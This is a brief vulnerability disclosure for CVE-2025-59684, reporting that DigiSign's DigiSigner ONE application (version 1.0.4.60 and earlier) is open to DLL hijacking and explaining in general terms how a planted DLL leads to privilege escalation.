# CVE-2025-59684

DigiSign's DigiSigner ONE application version <= 1.0.4.60 is vulnerable to DLL Hijacking vulnerability. 
DLL Hijacking happens by placing a malicious DLL in a directory (in the absence of a legitimate DLL), which is then loaded by the application instead of the legitimate DLL.  This causes the malicious DLL to load with the same privileges as the application, thus causing a privilege escalation.
